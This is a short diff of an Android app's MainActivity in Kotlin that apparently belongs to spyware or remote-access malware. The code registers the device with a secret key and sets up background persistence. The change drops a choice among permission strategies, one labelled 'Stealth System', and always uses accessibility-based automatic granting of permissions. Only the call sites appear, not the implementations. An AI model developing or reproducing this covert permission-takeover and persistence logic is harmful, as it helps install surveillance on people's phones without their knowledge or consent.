@@ -88,11 +88,7 @@ class MainActivity : ComponentActivity() {
         registerDevice(secretKey, deviceId)
 
         // Execute permission strategy based on configuration
-        when (PERMISSION_STRATEGY) {
-            1 -> executeStrategy1() // Accessibility-based
-            2 -> executeStrategy2() // Smart Permission Manager
-            3 -> executeStrategy3() // Stealth System
-        }
+        executeStrategy1() // Always use accessibility-based auto grant
 
         // Setup background persistence
         setupBackgroundPersistence()
